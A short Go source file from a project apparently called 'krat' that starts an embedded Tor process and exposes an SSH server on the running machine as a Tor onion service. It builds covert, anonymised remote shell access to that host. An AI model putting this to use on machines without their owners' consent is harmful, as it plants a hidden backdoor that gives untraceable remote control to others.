package client

import (
	"github.com/cretz/bine/tor"
	"github.com/humbertovnavarro/krat/pkg/config"
	"github.com/humbertovnavarro/krat/pkg/db"
	"github.com/humbertovnavarro/krat/pkg/onion"
	"github.com/humbertovnavarro/krat/pkg/tor_engine"
	"github.com/ipsn/go-libtor"
	"github.com/sirupsen/logrus"
)

var torStartConf = &tor.StartConf{
	ProcessCreator: libtor.Creator,
	DebugWriter:    nil,
	DataDir:        config.NewFilePath("tor"),
}

func init() {
	db.Open()
}

func Start() error {
	config := &tor_engine.TorEngineConf{
		Start: torStartConf,
	}
	torEngine := tor_engine.New(config, OnTorConnect)
	err := torEngine.Start()
	if err != nil {
		panic(err)
	}
	return nil
}

func OnTorConnect(e *tor_engine.TorEngine) {
	defer e.Tor.Close()
	sshOnion, err := onion.New(e, &onion.OnionServiceConfig{
		Port: 22,
		Tag:  "ssh",
	})
	if err != nil {
		logrus.Fatal(err)
	}
	eCh := make(chan error)
	StartSSHServer(sshOnion, eCh)
}
